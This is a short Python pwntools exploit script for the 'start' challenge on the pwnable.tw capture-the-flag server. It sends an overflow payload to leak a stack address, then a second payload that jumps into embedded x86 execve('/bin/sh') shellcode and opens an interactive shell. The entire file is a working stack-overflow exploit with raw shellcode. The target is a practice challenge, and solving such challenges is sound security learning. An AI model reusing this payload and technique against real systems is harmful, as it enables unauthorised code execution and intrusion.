#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

A4 = 4 * b'A'


def main():
    proc = remote('chall.pwnable.tw', 10000)
    proc.recvuntil("Let's start the CTF:")

    payload = 5 * A4 + p32(0x08048087)
    proc.send(payload)
    esp = u32(proc.recv()[:4])

    shellcode = b'\xeb\x0c\x5b\x31\xc0\x04\x0b\x31\xc9\x31\xd2\xcd\x80\xc3\xe8\xef\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00'
    payload = 5 * A4 + p32(esp + 0x14) + shellcode
    proc.send(payload)

    context.log_level = 'error'
    proc.interactive()


if __name__ == '__main__':
    main()
